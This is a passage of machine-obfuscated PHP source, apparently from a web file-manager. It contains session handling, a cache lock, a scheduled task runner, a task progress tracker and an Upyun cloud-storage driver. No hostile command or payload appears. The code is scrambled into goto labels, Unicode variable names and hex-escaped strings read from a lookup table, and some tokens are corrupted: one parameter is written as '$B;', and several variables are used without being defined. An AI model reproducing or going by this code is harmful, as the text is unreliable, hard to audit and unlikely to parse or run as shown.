(!$fﲈ) { $C = $FϮ[761] . $D퍢æ . $FϮ[67] . self::$errorMsg . $FϮ[67] . get_caller_msg(); $a觉 = "\x4c\157\x63\x6b\40\141\x63\164\x69\x6f\156\x3a\40{$fȉ}\40\164\x69\155\x65\x6f\x75\x74\54\x6f\166\145\162\x20{$D퍢æ}\40\x73"; $a觉 = self::$errorMsg ? self::$errorMsg : $Cϼ킲; write_log($C, $FϮ[762]); show_json($a觉, !1); } goto f; B͋: } public static function lockGet($eĠߟ) { $b = self::key($eĠߟ); if (self::$lockItem[$b]) { return self::$lockItem[$b]; } return self::init()->lockGet($b); } public static function unlock($D) { $f۟ɣ = self::key($D); self::$lockItem[$f۟ɣ] = null; return self::init()->unlock($f۟ɣ); } public static function unlockRuntime() { $dƕ =& $_SERVER[ԥ]; $b = self::init(); $fȋ϶ = !1; foreach (self::$lockItem as $A뒔 => $fӎ) { if (!$fӎ) { continue; } $b->unlock($A뒔); if (!$fȋ϶) { $fȋ϶ = !0; write_log($dƕ[763] . $A뒔 . $dƕ[67] . get_caller_msg(), $dƕ[762]); continue; } write_log($dƕ[763] . $A뒔, $dƕ[762]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto aƟ; cɣ: function beforeShutdownFatalError($A) { think_exception($A); } $_SERVER[$_SERVER[][48]] = $cߝ($_SERVER[$_SERVER[][45]]); $f솄 = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto f٩; DǓ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aČ; D쵨: $eʂ = $GLOBALS[$a񔻇[6]][$a񔻇[333]]; self::$sessionTime = $eʂ[$a񔻇[1364]]; $E޷ = SESSION_ID; goto cȖ; aČ: $a񔻇 =& $_SERVER[ԥ]; static $c⫢ = false; if ($c⫢) { return $c⫢; } goto D쵨; C: $a՜ĝ = $eʂ[$a񔻇[1366]]; $d峇 = $eʂ[$a՜ĝ]; $d؃Ă = $eʂ[$a񔻇[746]]; goto e凙; a팄: return $c⫢; goto CᎡ; cȖ: $E޷ = _get($GLOBALS, $a񔻇[1365], $E޷); if (self::$sessionSign) { } else { if (Cookie::get($E޷)) { self::$sessionSign = Cookie::get($E޷); } else { self::$sessionSign = guid(); } } Cookie::setSafe($E޷, self::$sessionSign, self::$sessionTime); goto C; e凙: switch ($a՜ĝ) { case $a񔻇[17]: self::$handle = Model($a񔻇[747]); break; case $a񔻇[748]: self::$handle = new CacheRedis($d峇, $d؃Ă); break; case $a񔻇[749]: self::$handle = new CacheMemcached($d峇, $d؃Ă); break; case $a񔻇[163]: $d峇[$a񔻇[75]] = $d峇[$a񔻇[75]] . $a񔻇[1367]; self::$handle = new CacheFile($d峇, $d؃Ă); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $c⫢ = new self(); goto a팄; CᎡ: } public static function sign($aϙӘ = false) { $aϙӘ && (self::$sessionSign = $aϙӘ); self::init(); return self::$sessionSign; } public static function set($f݋, $F = false) { self::init(); if (is_array($f݋)) { foreach ($f݋ as $dŔ => $D㌍) { array_set_value(self::$data, $dŔ, $D㌍); } } else { array_set_value(self::$data, $f݋, $F); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($A = false) { self::init(); if (!$A) { return self::$data; } return array_get_value(self::$data, $A); } public static function remove($A׷) { self::init(); unset(self::$data[$A׷]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ԥ][751])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto a; a: $eǂ =& $_SERVER[ԥ]; if (self::valueGet($eǂ[673]) != $eǂ[83]) { return; } if (self::valueGet($eǂ[1368]) == $eǂ[83]) { $CȺ۹ = self::valueGet($eǂ[1369]); if (time() - $CȺ۹ > 3600 * 2) { self::restart(); } return; } goto d쫫; d쫫: http_close(); self::valueSet($eǂ[1368], $eǂ[83]); Hook::bind($eǂ[1370], $eǂ[1371]); goto FŲй; FŲй: while (!0) { self::cacheClear(); if (self::valueGet($eǂ[673]) != $eǂ[83]) { self::valueSet($eǂ[1368], $eǂ[464]); self::log($eǂ[1372]); die; } self::valueSet($eǂ[1368], $eǂ[83]); self::valueSet($eǂ[1369], time()); self::taskRunAll(); sleep(self::valueGet($eǂ[1373])); } goto DşȨ; DşȨ: } public static function restart() { $e޴Ӌσ =& $_SERVER[ԥ]; http_close(); self::valueSet($e޴Ӌσ[673], $e޴Ӌσ[464]); sleep(self::valueGet($e޴Ӌσ[1373]) + 5); self::valueSet($e޴Ӌσ[1368], $e޴Ӌσ[464]); self::valueSet($e޴Ӌσ[673], $e޴Ӌσ[83]); } public static function shutdownEvent() { $eƼˊ =& $_SERVER[ԥ]; self::valueSet($eƼˊ[1368], $eƼˊ[464]); self::log($eƼˊ[1374]); } public static function config($d׎, $f) { $eԫύ =& $_SERVER[ԥ]; $b޿ = 20; $f = intval($f) <= $b޿ ? $b޿ : intval($f); self::valueSet($eԫύ[673], $d׎); self::valueSet($eԫύ[1373], $f); } private static function taskRunAll() { $AϏ弸 =& $_SERVER[ԥ]; $Bڄ = Model($AϏ弸[1375])->listData(); $Eʖ = count($Bڄ); for ($bˑ = 0; $bˑ < $Eʖ; $bˑ++) { $A = $Bڄ[$bˑ]; if ($A[$AϏ弸[1376]] != $AϏ弸[83]) { continue; } if (!self::taskTimeCheck($A)) { continue; } self::taskRun($A); } Hook::trigger($AϏ弸[1377]); } private static function taskTimeCheck($b) { goto fǐ; eʂ: $eƬՉ = strtotime($Cޙ[1378] . $Bڼ֬[$Cޙ[1379]] . $Cޙ[1380]) - strtotime($Cޙ[1381]); $cݷ = time() - strtotime(date($Cޙ[1382]) . $Cޙ[1383]); $Eʽ = $cݷ >= $eƬՉ && $cݷ <= $eƬՉ + 3600; goto E; fǐ: $Cޙ =& $_SERVER[ԥ]; $Bڼ֬ = json_decode($b[$Cޙ[186]], !0); $e = intval($b[$Cޙ[1369]]); goto eʂ; E: switch ($Bڼ֬[$Cޙ[29]]) { case $Cޙ[1384]: if (time() - $e < 3600 * 24 * 30) { return !1; } if ($Bڼ֬[$Cޙ[1384]] == date($Cޙ[1385]) && $Eʽ) { return !0; } break; case $Cޙ[1386]: if (time() - $e < 3600 * 24 * 7) { return !1; } $FΓ = date($Cޙ[1387]) == 0 ? 7 : date($Cޙ[1387]); if ($Bڼ֬[$Cޙ[1386]] == $FΓ && $Eʽ) { return !0; } break; case $Cޙ[1379]: if (time() - $e < 3600 * 24) { return !1; } if ($Eʽ) { return !0; } break; case $Cޙ[1388]: if (time() - $e >= floatval($Bڼ֬[$Cޙ[1388]]) * 60) { return !0; } break; default: break; } return !1; goto eݽ; eݽ: } public static function taskRun($aз) { goto Bˡ٫; d: Model($Fϴȴ[1393])->add(array($Fϴȴ[1394] => $Fϴȴ[33], $Fϴȴ[1395] => $Fϴȴ[464], $Fϴȴ[29] => $Fϴȴ[1396] . $aз[$Fϴȴ[363]], $Fϴȴ[1397] => json_encode(array($Fϴȴ[28] => $aз[$Fϴȴ[28]], $Fϴȴ[1398] => timeFloat() - $f, $Fϴȴ[277] => $Cޟ)))); self::log($Fϴȴ[1399] . $aз[$Fϴȴ[363]] . $Fϴȴ[1400] . $Cޟ); return !0; goto fӽ϶; aھ: $f = timeFloat(); $Cޟ = $Fϴȴ[33]; switch ($aз[$Fϴȴ[29]]) { case $Fϴȴ[291]: $C = url_request($aз[$Fϴȴ[1392]], $Fϴȴ[212], !1, !1, !1, !1, 5); $Cޟ = strlen($C); break; case $Fϴȴ[211]: $Cޟ = Hook::apply($aз[$Fϴȴ[1392]]); default: break; } goto d; Bˡ٫: $Fϴȴ =& $_SERVER[ԥ]; self::log($Fϴȴ[1389] . $aз[$Fϴȴ[363]] . $Fϴȴ[1390] . $aз[$Fϴȴ[28]] . $Fϴȴ[1391] . $aз[$Fϴȴ[1392]]); Model($Fϴȴ[1375])->run($aз[$Fϴȴ[363]]); goto aھ; fӽ϶: } private static function valueGet($Dͅҹ) { $f =& $_SERVER[ԥ]; $F = $f[1401]; $a = Model($f[1402])->get($Dͅҹ, $F); if (is_null($a)) { Model($f[1402])->set($f[1373], 10, $F); Model($f[1402])->set($f[673], $f[83], $F); Model($f[1402])->set($f[1368], $f[464], $F); $a = Model($f[1402])->get($Dͅҹ, $F); } return $a; } private static function valueSet($Cɉ맢, $Aȟå) { $aЎ =& $_SERVER[ԥ]; return Model($aЎ[1402])->set($Cɉ맢, $Aȟå, $aЎ[1401]); } protected static function log($E됏) { write_log($E됏, $_SERVER[ԥ][1403]); } private static function cacheClear() { $d =& $_SERVER[ԥ]; $Aԛ = Model($d[1402])->cacheKey($d[1401]); Cache::clearMemory($Aԛ); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\x69\x6e\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Eߗ, $B˓ = '', $dϮҘ = 0, $e = '') { goto d; a魱: Hook::bind($E֒[1370], array($this, $E֒[1412])); Hook::bind($E֒[1413], array($this, $E֒[1414])); $this->startAfter(); goto eɬ; d: $E֒ =& $_SERVER[ԥ]; if (self::get($Eߗ)) { return; } $this->task = array($E֒[363] => $Eߗ, $E֒[1404] => USER_ID, $E֒[1312] => $e, $E֒[29] => $B˓, $E֒[963] => $E֒[33], $E֒[961] => $dϮҘ, $E֒[973] => 0, $E֒[1405] => 0, $E֒[1406] => 0, $E֒[1407] => timeFloat(), $E֒[1408] => 0, $E֒[1409] => 0, $E֒[1410] => 0, $E֒[1411] => 0, $E֒[673] => $E֒[1368]); goto a魱; eɬ: Hook::trigger($E֒[1415], $this->task); $this->task[$E֒[1409]] = timeFloat(); self::valueSet($this->task[$E֒[363]], $this->task); goto a׍پ; a׍پ: } public function end() { goto D՜; dͯ: $A킧 = timeFloat() - $this->task[$bے[1407]]; self::log($bے[1416] . $this->task[$bے[363]] . $bے[1417] . $A킧 . $bے[1418]); Hook::unbind($bے[1370], array($this, $bے[1412])); goto cſ; cſ: Hook::unbind($bے[1413], array($this, $bے[1414])); $this->endAfter(); $this->task = !1; goto E훫; D՜: $bے =& $_SERVER[ԥ]; if (!$this->task) { return; } if ($this->task[$bے[1409]]) { self::valueSet($this->task[$bے[363]], !1); } goto dͯ; E훫: } public function update($F↺ = 0) { goto A; A: $a܌̈ =& $_SERVER[ԥ]; $Dؖȣ =& $this->task; if (!$Dؖȣ) { return; } goto dô뇽; dô뇽: $Dؖȣ[$a܌̈[973]] += $F↺; $Dؖȣ[$a܌̈[1408]] = timeFloat(); if ($Dؖȣ[$a܌̈[961]]) { if ($Dؖȣ[$a܌̈[961]] < $Dؖȣ[$a܌̈[973]]) { $Dؖȣ[$a܌̈[961]] = $Dؖȣ[$a܌̈[973]]; } $Fƌ = timeFloat() - $Dؖȣ[$a܌̈[1407]] - $Dؖȣ[$a܌̈[1410]]; $Dؖȣ[$a܌̈[1405]] = $Dؖȣ[$a܌̈[973]] / $Dؖȣ[$a܌̈[961]]; $Dؖȣ[$a܌̈[1406]] = $Dؖȣ[$a܌̈[973]] / $Fƌ; if ($Dؖȣ[$a܌̈[1405]] > 0) { $Dؖȣ[$a܌̈[1411]] = $Fƌ * (1 - $Dؖȣ[$a܌̈[1405]]) / $Dؖȣ[$a܌̈[1405]]; } $Dؖȣ[$a܌̈[1411]] = $Dؖȣ[$a܌̈[1411]] <= 0 ? 0 : $Dؖȣ[$a܌̈[1411]]; } goto E¡; FƆϩ: Hook::trigger($a܌̈[1422], $Dؖȣ); self::valueSet($Dؖȣ[$a܌̈[363]], $Dؖȣ); goto E; E¡: $this->updateAfter(); $aߨ俈 = 0.2; if (timeFloat() - $Dؖȣ[$a܌̈[1409]] < $aߨ俈) { return; } goto B; E˃: $Dؖȣ[$a܌̈[673]] = $f ? $f : $Dؖȣ[$a܌̈[673]]; $Dؖȣ[$a܌̈[1410]] = $D[$a܌̈[1410]] ? $D[$a܌̈[1410]] : 0; $Dؖȣ[$a܌̈[1409]] = timeFloat(); goto FƆϩ; B: $D = self::get($Dؖȣ[$a܌̈[363]]); $f = $D[$a܌̈[673]]; if ($f == self::STATYS_KILL) { $b = array($a܌̈[1419] => LNG($a܌̈[1420]), $a܌̈[1015] => !1); Cache::set($a܌̈[1421] . $this->task[$a܌̈[363]], $b, 30); $this->end(); die; } else { if ($f == self::STATYS_STOP) { $E = 2; $D[$a܌̈[1410]] += $E; self::valueSet($Dؖȣ[$a܌̈[363]], $D); sleep($E); $this->update(); return; } } goto E˃; E: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($eɳ) { $CᲘ =& $_SERVER[ԥ]; Cache::set($CᲘ[1421] . $this->task[$CᲘ[363]], $eɳ, 60); return $eɳ; } public static function get($C݉Ϸ) { return self::valueGet($C݉Ϸ); } public static function listData() { $bꌐ߆ = self::valueGet(); return array_sort_by($bꌐ߆, $_SERVER[ԥ][1407], !0); } public static function kill($Cŏ) { return self::changeStatus($Cŏ, self::STATYS_KILL); } public static function stop($Dŧڏ) { return self::changeStatus($Dŧڏ, self::STATYS_STOP); } public static function restart($dտ) { return self::changeStatus($dտ, self::STATYS_RUNNING); } public static function killAll() { $eݎ =& $_SERVER[ԥ]; $dҩ = self::listData(); foreach ($dҩ as $E) { self::kill($E[$eݎ[363]]); } sleep(2); foreach ($dҩ as $E) { self::valueSet($E[$eݎ[363]], !1); } } private static function changeStatus($f鞝, $B;) { goto cӃޯ; cӃޯ: $c =& $_SERVER[ԥ]; $D඿ = self::valueGet($f鞝); if (!$D඿) { return !1; } goto D׌; Eь: return !0; goto BƟ؟; D׌: $D඿[$c[673]] = $B;; self::valueSet($f鞝, $D඿); self::log($c[1423] . $D඿[$c[363]] . $c[1424] . $B;); goto Eь; BƟ؟: } public static function valueGet($A = false) { $bĽ =& $_SERVER[ԥ]; if ($A) { $B䬻 = Model($bĽ[395])->where(array($bĽ[89] => $A, $bĽ[29] => $bĽ[1425]))->find(); return $B䬻 ? json_decode($B䬻[$bĽ[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($EƑȺ = false) { goto DڹڜǗ; Eճ: return $FŸԗ; goto c; DڹڜǗ: $Eڬ =& $_SERVER[ԥ]; $D = array($Eڬ[29] => $Eڬ[1425]); if ($EƑȺ) { $D[$Eڬ[1404]] = $EƑȺ; } goto cƊ㌻; cƊ㌻: $FŸԗ = Model($Eڬ[395])->where($D)->select(); $FŸԗ = $FŸԗ ? $FŸԗ : array(); foreach ($FŸԗ as $C❪ => $B) { $FŸԗ[$C❪] = json_decode($B[$Eڬ[355]], !0); } goto Eճ; c: } public static function valueSet($B, $E̩) { goto Cխ҃; aꑗ: Model($Bㄶ[395])->add($e, array(), !0); goto Dţ; Cխ҃: $Bㄶ =& $_SERVER[ԥ]; if (!$E̩) { return Model($Bㄶ[395])->where(array($Bㄶ[89] => $B, $Bㄶ[29] => $Bㄶ[1425]))->delete(); } $B = json_encode($E̩); goto FԼΝ; FԼΝ: if (!$B) { ob_start(); var_dump($E̩); $FŃЌ = ob_get_clean(); self::log($Bㄶ[1426] . json_encode_force($FŃЌ)); } if (!$B || !$E̩[$Bㄶ[363]]) { return !1; } $e = array($Bㄶ[29] => $Bㄶ[1425], $Bㄶ[1404] => USER_ID, $Bㄶ[89] => $B, $Bㄶ[355] => $B); goto aꑗ; Dţ: } public static function log($F) { write_log($F, $_SERVER[ԥ][1427]); } } goto dÒ; f: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\72\x2f\x2f\x76\x30\x2e\141\x70\151\56\x75\x70\x79\165\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dɢ) { parent::__construct(); $this->_init($dɢ); } public function _init($Bս) { foreach ($Bս as $Bʯʬ => $B狌) { if (isset($this->{$Bʯʬ})) { $this->{$Bʯʬ} = $B狌; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[ԥ][1216], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($d̷, $fø = "\x47\x45\x54") { $bӲ =& $_SERVER[ԥ]; $Cݙ = gmdate($bӲ[1180]); $bĜԧ = base64_encode(hash_hmac($bӲ[1217], "{$fø}\46{$d̷}\46{$Cݙ}", md5("{$this->userpass}"), !0)); $Cƅ = array("\101\165\164\150\157\162\151\x7a\141\x74\151\157\156\x3a\125\120\x59\x55\x4e\40{$this->username}\72{$bĜԧ}", "\x44\141\164\145\x3a{$Cݙ}"); return $Cƅ; } public function ussRequest($A鍞͋, $EҩӚ = "\107\105\124", $Bѣ = false, $A鮪 = false, $B = false) { goto aୌ; aʣ: if (!$aȫ) { return array($AË[1015] => !1, $AË[1017] => $AË[1218]); } if (strtolower($EҩӚ) == $AË[180] || in_array($aȫ[$AË[1015]], array($AË[1076], $AË[1219]))) { $Bѣ = $aȫ[$AË[1220]]; } else { $Bѣ = json_decode($aȫ[$AË[1017]], !0); if (!$Bѣ) { $Bѣ = $aȫ[$AË[1017]]; } else { if (!$aȫ[$AË[673]] && isset($Bѣ[$AË[1221]])) { $Bѣ = $Bѣ[$AË[1221]]; } } } return array($AË[1015] => $aȫ[$AË[673]], $AË[1017] => $Bѣ); goto f; bՆ: $e = $this->ussHeaders($c҄, $EҩӚ); if ($A鮪) { $e = array_merge($e, $A鮪); } $aȫ = url_request($this->endpoint . $c҄, $EҩӚ, $Bѣ, $e, $B); goto aʣ; aୌ: $AË =& $_SERVER[ԥ]; $A鍞͋ = trim($A鍞͋, $AË[8]); $c҄ = "\57{$this->bucket}\57{$A鍞͋}"; goto bՆ; f: } public function mkfile($bѡ, $b = '', $A씄 = REPEAT_RENAME) { if ($this->setContent($bѡ, $b)) { return $this->getPathOuter($bѡ); } return !1; } public function mkdir($dŇ, $A̽س = REPEAT_SKIP) { $fް =& $_SERVER[ԥ]; $Aٸ = trim($dŇ, $fް[8]); if ($this->_isFolder($Aٸ)) { return $this->getPathOuter($Aٸ); } $d砶 = array($fް[1222]); $a = $this->ussRequest($Aٸ, $fް[208], !1, $d砶); return $a[$fް[1015]] ? $this->getPathOuter($Aٸ) : !1; } public function copyFile($Eȶ, $e) { $D =& $_SERVER[ԥ]; $dϺר = array($D[1223] . "\x2f{$this->bucket}\x2f{$Eȶ}", $D[1224]); $Fќ = $this->ussRequest($e, $D[210], !1, $dϺר); return $Fќ[$D[1015]] ? !0 : !1; } public function moveFile($cΓ, $B) { $F =& $_SERVER[ԥ]; $aɃ = array($F[1225] . "\x2f{$this->bucket}\x2f{$cΓ}", $F[1224]); $fŠ = $this->ussRequest($B, $F[210], !1, $aɃ); return $fŠ[$F[1015]] ? !0 : !1; } public function delFile($eш) { $c =& $_SERVER[ԥ]; $c؍󱷏 = $this->ussRequest($eш, $c[1226]); return $c؍󱷏[$c[1015]] ? !0 : !1; } public function delFolder($AŉĽ) { $c =& $_SERVER[ԥ]; $Cԧ = $this->listAll($AŉĽ); krsort($Cԧ); foreach ($Cԧ as $B) { $this->ussRequest($B[$c[75]], $c[1226]); } return $this->ussRequest($AŉĽ, $c[1226]); } public function rename($c, $Dë֏) { if ($this->isFile($c)) { $Dë֏ = get_path_father($c) . $Dë֏; return $this->moveFile($c, $Dë֏); } return $this->renameObject($c, $Dë֏); } public function fileInfo($AЅ, $d͏ = false, $A = array()) { $C =& $_SERVER[ԥ]; if ($d͏) { return array($C[28] => $this->pathThis($AЅ), $C[75] => $this->getPathOuter($C[8] . $AЅ), $C[29] => $C[163], $C[77] => isset($A[$C[321]]) ? $A[$C[321]] : 0, $C[156] => $this->ext($AЅ)); } $c = array($C[28] => $this->pathThis($AЅ), $C[75] => $this->getPathOuter($C[8] . $AЅ), $C[29] => $C[163], $C[183] => 0, $C[106] => isset($B[$C[1227]]) ? $B[$C[1227]] : 0, $C[77] => isset($A[$C[321]]) ? $A[$C[321]] : 0, $C[156] => $this->ext($AЅ), $C[184] => !0, $C[185] => !0); if (empty($A)) { $A = $this->objectMeta($AЅ); if (!$A) { return $c; } $c[$C[183]] = $A[$C[1228]]; $c[$C[106]] = $A[$C[1229]]; $c[$C[77]] = $A[$C[77]]; } return $c; } public function folderInfo($a, $d = false) { $cǓ =& $_SERVER[ԥ]; if ($d) { return array($cǓ[28] => $this->pathThis($a), $cǓ[75] => $this->getPathOuter($cǓ[8] . $a), $cǓ[29] => $cǓ[76]); } $Fݠ줕 = array($cǓ[28] => $this->pathThis($a), $cǓ[75] => $this->getPathOuter($cǓ[8] . $a), $cǓ[29] => $cǓ[76], $cǓ[183] => 0, $cǓ[106] => isset($Bט[$cǓ[1227]]) ? $Bט[$cǓ[1227]] : 0, $cǓ[1137] => !0, $cǓ[1138] => !0); if (empty($fپ)) { $fپ = $this->objectMeta($a); if (!$fپ) { return $Fݠ줕; } $Fݠ줕[$cǓ[183]] = $fپ[$cǓ[1228]]; $Fݠ줕[$cǓ[106]] = $fپ[$cǓ[1229]]; } return $Fݠ줕; } private function fileList($b܌, $f = 0, $dς = 1000) { $eԿ =& $_SERVER[ԥ]; $A̍ = array($eԿ[1230], $eԿ[1231] . $dς); if ($f) { $A̍[] = $eԿ[1232] . $f; } $b󣣲 = $this->ussRequest($b܌, $eԿ[212], !1, $A̍); return !$b󣣲[$eԿ[1015]] ? !1 : $b󣣲[$eԿ[1017]]; } public function listPath($eƣ, $fݱƢ = false) { goto Dי; Dי: $A =& $_SERVER[ԥ]; $BڂԔ = $A[33]; $bӏ = 1000; goto cŰ; cŰ: $d = $AԆ = array(); $bշގ = rtrim($eƣ, $A[8]) . $A[8]; while (!0) { $D̄ = $this->fileList($eƣ, $BڂԔ, $bӏ); if (!$D̄) { return !1; } $BڂԔ = isset($D̄[$A[1233]]) ? $D̄[$A[1233]] : $A[33]; $Dը = isset($D̄[$A[1234]]) ? $D̄[$A[1234]] : array(); foreach ($Dը as $f΃) { if ($f΃[$A[29]] == $A[76]) { $d[] = $this->folderInfo($bշގ . $f΃[$A[28]], $fݱƢ, $f΃); } else { $AԆ[] = $this->fileInfo($bշގ . $f΃[$A[28]], $fݱƢ, $f΃); } } if (count($Dը) < $bӏ) { break; } } goto E򨺞; E򨺞: return array($A[74] => $d, $A[73] => $AԆ); goto C; C: } private function recursionAllFiles($C, &$Dδ) { $BВ =& $_SERVER[ԥ]; $fƽ = $BВ[33]; $e = 1000; $D = $aҸ = array(); $D飄 = rtrim($C, $BВ[8]) . $BВ[8]; while (!0) { $D = $this->fileList($C, $fƽ, $e); if (!$D) { return !1; } $fƽ = isset($D[$BВ[1233]]) ? $D[$BВ[1233]] : $BВ[33]; $CӮɯ = isset($D[$BВ[1234]]) ? $D[$BВ[1234]] : array(); foreach ($CӮɯ as $C펏) { $f֞ = array($BВ[75] => $D飄 . $C펏[$BВ[28]], $BВ[76] => $C펏[$BВ[29]] == $BВ[76] ? 1 : 0, $BВ[77] => isset($C펏[$BВ[321]]) ? $C펏[$BВ[321]] : 0); $Dδ[] = $f֞; if ($f֞[$BВ[76]] == 1) { $this->recursionAllFiles($f֞[$BВ[75]], $Dδ); } } if (count($CӮɯ) < $e) { break; } } } public function has($Aۏ, $b˷ = false, $f߿ = true) { goto B촩񺻟; CΔ: while (!0) { $D׌Ο = $this->fileList($Aۏ, $dˏ, $Aו); if (!$D׌Ο) { return !1; } $dˏ = isset($D׌Ο[$fſی[1233]]) ? $D׌Ο[$fſی[1233]] : $fſی[33]; $d⟇ = isset($D׌Ο[$fſی[1234]]) ? $D׌Ο[$fſی[1234]] : array(); if (empty($d⟇)) { break; } $Fݎߢ = array_to_keyvalue($d⟇, $fſی[33], $fſی[29]); $Eˈ؄ = array_count_values($Fݎߢ); $d = isset($Eˈ؄[$fſی[76]]) ? $Eˈ؄[$fſی[76]] : 0; $bʸ = count($Fݎߢ) - $d; if ($b˷) { $f += $d; $Cǔ += $bʸ; if ($Fۅ < $Aו) { break; } continue; } if ($f߿) { if ($bʸ) { return !0; } } else { if ($d) { return !0; } } if (count($d⟇) < $Aו) { break; } } if ($b˷) { return array($fſی[187] => $Cǔ, $fſی[188] => $f); } return !1; goto BՏ; B촩񺻟: $fſی =& $_SERVER[ԥ]; $dˏ = $fſی[33]; $Aו = 1000; goto B; B: $Cǔ = 0; $f = 0; $C̕ = rtrim($Aۏ, $fſی[8]) . $fſی[8]; goto CΔ; BՏ: } public function listAll($a٦) { $fǫ = array(); $this->recursionAllFiles($a٦, $fǫ); return $fǫ; } public function canRead($fȌ) { return $this->exist($fȌ) ? !0 : !1; } public function canWrite($fߍМ) { return $this->exist($fߍМ) ? !0 : !1; } public function getContent($D) { return $this->fileSubstr($D, 0, -1); } public function setContent($C, $Fи = '') { $B =& $_SERVER[ԥ]; if (!$Fи) { $c = $this->ussRequest($C, $B[208]); return $c[$B[1015]]; } $a = $this->tempFile($this->pathThis($C)); file_put_contents($a, $Fи); if ($this->upload($C, $a)) { $this->tempFileRemve($a); return !0; } return !1; } public function fileSubstr($bᚺȦ, $a, $Cڢ) { $dҭ =& $_SERVER[ԥ]; if (!($a䋩 = $this->link($bᚺȦ))) { return !1; } $F = !1; if ($Cڢ > 0) { $BɊ = $a + $Cڢ - 1; $F = array($dҭ[1195] . $a . $dҭ[408] . $BɊ); } $Aƃ = url_request($a䋩, $dҭ[212], !1, $F); return $Aƃ[$dҭ[673]] ? $Aƃ[$dҭ[1017]] : !1; } public function upload($Bݯь, $E, $Bí养 = false, $C䦤 = REPEAT_REPLACE) { goto bܰĭ; f񌌏: $A = $D觘[$C犲[1240]]; $dߋ = fopen($E, $C犲[1145]); if (!$dߋ) { return !1; } goto e귍Ί; bܰĭ: $C犲 =& $_SERVER[ԥ]; $eþآ = IO::size($E); if ($eþآ <= 1024 * 1024 * 200) { $D૔Ҙ = array($C犲[1235] . $E); $bȈ = $this->ussRequest($Bݯь, $C犲[210], $D૔Ҙ); return $bȈ[$C犲[1015]] ? $this->getPathOuter($Bݯь) : !1; } goto Fؚ; e귍Ί: do { $e䥍 = $D觘[$C犲[1241]]; fseek($dߋ, $c俖); $aϮ = fread($dߋ, $e䥍); $F׸ = 0; do { $F׸++; $D觘 = $this->uploadPart($Bݯь, $D觘, $aϮ); } while (!$D觘 && $F׸ < 3); if (!$D觘) { return !1; } $A = $D觘[$C犲[1240]]; $c俖 += $e䥍; } while ($A != -1); fclose($dߋ); $B栭 = array($C犲[1242], $C犲[1243] . $D觘[$C犲[1244]], $C犲[1238]); goto dƂ; D٠≄: if (!$bȈ[$C犲[1015]]) { return !1; } $D觘 = $bȈ[$C犲[1017]]; $c俖 = 0; goto f񌌏; dƂ: $bȈ = $this->ussRequest($Bݯь, $C犲[210], !1, $B栭); return $bȈ[$C犲[1015]] ? $this->getPathOuter($d뗉) : !1; goto Cϴ; Fؚ: $e훭 = 1024 * 1024 * 10; $B栭 = array($C犲[1236], $C犲[1237] . $eþآ, $C犲[1238], $C犲[1239] . $e훭); $bȈ = $this->ussRequest($Bݯь, $C犲[210], !1, $B栭); goto D٠≄; Cϴ: } private function uploadPart($AΘˑ, $B, &$aԑƂߋ) { $d֣ =& $_SERVER[ԥ]; $eޝܡ = array($d֣[1245], $d֣[1243] . $B[$d֣[1244]], $d֣[1246] . $B[$d֣[1240]], $d֣[1247] . $B[$d֣[1241]]); $D؂抈 = $this->ussRequest($AΘˑ, $d֣[210], $aԑƂߋ, $eޝܡ); return !$D؂抈[$d֣[1015]] ? $D؂抈[$d֣[1015]] : $D؂抈[$d֣[1017]]; } public function uploadFormData($b擛, $A = 3600) { return $this->uploadPolicy($b擛, $A); } public function multiUploadFormData($a󮪆, $f = 3600) { $E퓪 =& $_SERVER[ԥ]; $e = (int) $GLOBALS[$E퓪[7]][$E퓪[77]]; return $this->uploadPolicy($a󮪆, $f, $e); } private function uploadPolicy($C㊋, $cӖł = 3600, $Bݫ = 0) { goto c墓; bޖ: $f = array($d면[1248] => $this->bucket, $d면[1249] => $C㊋, $d면[1250] => time() + $cӖł, $d면[1251] => $e򵵙); if ($Bݫ) { $f[$d면[1166]] = $Bݫ; } $C⏔ = base64_encode(json_encode($f)); goto b须; c墓: $d면 =& $_SERVER[ԥ]; $dʓ = $d면[8] . $this->bucket; $e򵵙 = gmdate($d면[1180]); goto bޖ; b须: $eĩƅ = base64_encode(hash_hmac($d면[1217], "\120\117\x53\x54\46{$dʓ}\46{$e򵵙}\46{$C⏔}", md5("{$this->userpass}"), !0)); $e¿ = array($d면[1088] => $C⏔, $d면[1252] => "\x55\x50\x59\x55\x4e\x20{$this->username}\72{$eĩƅ}", $d면[165] => $this->endpoint . $dʓ); return $e¿; goto b䱊; b䱊: } public function download($Bϳ܈, $E) { goto E훅; Eآ: $d = 1024 * 200; $aך݈ = fopen($F, $_SERVER[ԥ][1201]); while (!0) { $BӉѐ = $this->fileSubstr($Bϳ܈, $cÎ, $d); if ($BӉѐ === !1) { return !1; } fwrite($aך݈, $BӉѐ); $cÎ += $d; if (strlen($BӉѐ) < $d) { break; } } goto Aࡍ; E훅: $F = IO::getPathInner(IO::mkfile($E)); if (!($b = 